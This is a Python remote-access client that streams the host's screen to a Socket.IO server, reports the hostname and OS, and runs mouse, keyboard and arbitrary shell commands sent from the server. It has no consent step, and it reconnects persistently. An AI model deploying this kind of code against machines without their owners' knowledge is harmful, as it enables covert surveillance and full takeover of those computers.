import socketio
import time
import os
import platform
import base64
import threading
from io import BytesIO
from mss import mss
import pyautogui
from PIL import Image

# Configuration
SERVER_URL = "http://localhost:5000" # Change this to your Render URL
INTERVAL = 0.5 # Frequency of screen capture (seconds)

sio = socketio.Client()

@sio.event
def connect():
    print("Connected to server")
    sio.emit('client_auth', {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}"
    })

@sio.event
def disconnect():
    print("Disconnected from server")

@sio.on('remote_command')
def handle_command(data):
    # Process mouse/keyboard input from admin
    # data: {type: 'click'|'move'|'key', x: 100, y: 100, key: 'a'}
    try:
        cmd_type = data.get('type')
        if cmd_type == 'move':
            pyautogui.moveTo(data['x'], data['y'])
        elif cmd_type == 'click':
            pyautogui.click(data['x'], data['y'])
        elif cmd_type == 'key':
            pyautogui.press(data['key'])
        elif cmd_type == 'shell':
            import subprocess
            result = subprocess.check_output(data['command'], shell=True, stderr=subprocess.STDOUT)
            sio.emit('shell_output', {"output": result.decode('utf-8', errors='ignore')})
    except Exception as e:
        print(f"Error executing command: {e}")

def capture_screen():
    with mss() as sct:
        while True:
            if sio.connected:
                try:
                    # Capture screen
                    img = sct.grab(sct.monitors[1])
                    # Convert to PIL and compress
                    pil_img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                    # Scale down for performance
                    pil_img.thumbnail((800, 600))
                    
                    buffer = BytesIO()
                    pil_img.save(buffer, format="JPEG", quality=40)
                    frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    
                    sio.emit('screen_frame', {"frame": frame_data})
                except Exception as e:
                    print(f"Capture error: {e}")
            time.sleep(INTERVAL)

if __name__ == '__main__':
    # Start capture thread
    threading.Thread(target=capture_screen, daemon=True).start()
    
    # Connect to server
    while True:
        try:
            if not sio.connected:
                sio.connect(SERVER_URL)
            sio.wait()
        except Exception as e:
            print(f"Connection failed, retrying: {e}")
            time.sleep(5)
